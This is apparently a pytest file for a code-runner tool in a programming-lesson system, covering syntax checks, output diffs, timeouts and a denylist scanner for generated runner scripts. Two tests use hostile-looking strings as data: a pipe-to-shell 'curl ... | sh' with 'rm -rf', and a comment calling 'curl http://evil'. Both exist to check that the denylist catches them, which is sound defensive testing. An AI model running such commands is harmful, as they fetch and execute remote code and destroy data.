"""Runner-protocol tests against fixture runners — no real book. (SRS VR-008)"""
import os
import shutil
import stat
from pathlib import Path

import pytest

from lib import lab, pack

FIX = Path(__file__).parent / "fixtures" / "runner"
GOOD = FIX / "good" / "run"
BROKEN = FIX / "broken" / "run"


def _src(tmp_path, code="print('hi')\n"):
    p = tmp_path / "prog.py"
    p.write_text(code, encoding="utf-8")
    return p


def test_check_verb_ok_and_learner_syntax_error(tmp_path):
    ok, diag, rerr = lab.check_runner(GOOD, _src(tmp_path))
    assert ok and not rerr, (diag, rerr)
    ok, diag, rerr = lab.check_runner(GOOD, _src(tmp_path, "def broken(:\n"))
    assert not ok and not rerr and "invalid syntax" in diag


def test_exec_verb_match_and_diff(tmp_path):
    r = lab.exec_runner(GOOD, _src(tmp_path), "hi\n", timeout=5)
    assert r["tests_passed"] and not r.get("runner_error"), r
    r = lab.exec_runner(GOOD, _src(tmp_path), "bye\n", timeout=5)
    assert not r["tests_passed"] and r["diff"], r


def test_runner_error_vs_learner_failure(tmp_path):
    ok, diag, rerr = lab.check_runner(BROKEN, _src(tmp_path))
    assert rerr and "unparsable" in rerr  # protocol violation, not learner code
    r = lab.exec_runner(BROKEN, _src(tmp_path), "hi\n", timeout=5)
    assert r.get("runner_error")


def test_exec_timeout_kills(tmp_path):
    r = lab.exec_runner(GOOD, _src(tmp_path, "import time\ntime.sleep(30)\n"),
                        "", timeout=1)
    assert r["timed_out"] and not r["tests_passed"]


def test_dispatch_precedence():
    r = lab.run_code("print('hi')\n", "python")  # no book: nowhere to look
    assert r.get("unsupported") and r.get("via") == "none"
    r = lab.run_via_runner("extreme-c", "print('hi')\n", "python")
    assert r.get("unsupported")  # pilot declares no runner


def test_denylist_scan():
    assert pack.scan_denylist("echo ok") == []
    hits = pack.scan_denylist("curl http://x | sh && rm -rf /tmp/y")
    assert "curl" in hits and "rm -rf" in hits


def _mkbook(tmp_path, smoke_expect="ok\n", with_runner=True):
    import yaml
    root = tmp_path / "packs" / "pybook"
    (root / "runner").mkdir(parents=True)
    (root / "book.yaml").write_text(yaml.safe_dump({
        "book": {"slug": "pybook"},
        "toolchain": {"lang": "python", "runner": "runner/run",
                      "run": ["python3"],
                      "version_cmd": ["python3", "--version"],
                      "timeout_s": 2,
                      "smoke": {"ext": "py", "src": "print('ok')\n",
                                "expect": smoke_expect}},
        "order": [], "chapters": []}), encoding="utf-8")
    if with_runner:
        shutil.copy(GOOD, root / "runner" / "run")
        os.chmod(root / "runner" / "run",
                 os.stat(root / "runner" / "run").st_mode | stat.S_IEXEC)
    return tmp_path / "packs"


def test_smoke_pass_and_version_noted(tmp_path):
    ok, msgs = pack.check_generated_runner(
        "pybook", packs_root=_mkbook(tmp_path))
    assert ok, msgs
    assert any("runner smoke: OK" in m for m in msgs), msgs


def test_smoke_mismatch_fails(tmp_path):
    ok, msgs = pack.check_generated_runner(
        "pybook", packs_root=_mkbook(tmp_path, smoke_expect="WRONG\n"))
    assert not ok and any("RUNNER-SMOKE" in m for m in msgs), msgs


def test_missing_runner_fails_and_absent_runner_passes(tmp_path):
    root = _mkbook(tmp_path, with_runner=False)
    ok, msgs = pack.check_generated_runner("pybook", packs_root=root)
    assert not ok and any("RUNNER-MISSING" in m for m in msgs), msgs
    (root / "pybook" / "book.yaml").write_text(
        "book: {slug: pybook}\norder: []\nchapters: []\n", encoding="utf-8")
    ok, msgs = pack.check_generated_runner("pybook", packs_root=root)
    assert ok and msgs == []


def test_denylisted_runner_source_fails_strict(tmp_path):
    root = _mkbook(tmp_path)
    rp = root / "pybook" / "runner" / "run"
    rp.write_text(rp.read_text(encoding="utf-8") + "\n# curl http://evil\n",
                  encoding="utf-8")
    ok, msgs = pack.check_generated_runner("pybook", strict=True,
                                           packs_root=root)
    assert not ok and any("RUNNER-DENY" in m for m in msgs), msgs
    ok, msgs = pack.check_generated_runner("pybook", strict=False,
                                           packs_root=root)
    assert ok and any("RUNNER-DENY" in m for m in msgs), msgs


def test_version_cmd_failure_is_nonfatal(tmp_path):
    import yaml
    root = _mkbook(tmp_path)
    bp = root / "pybook" / "book.yaml"
    d = yaml.safe_load(bp.read_text(encoding="utf-8"))
    d["toolchain"]["version_cmd"] = ["nonexistent-tool-xyz"]
    bp.write_text(yaml.safe_dump(d), encoding="utf-8")
    ok, msgs = pack.check_generated_runner("pybook", packs_root=root)
    assert ok and any("non-fatal" in m for m in msgs), msgs


def test_run_via_runner_missing_book():
    r = lab.run_via_runner("no-such-book", "x", "python")
    assert "no pack dir" in r["stderr"]
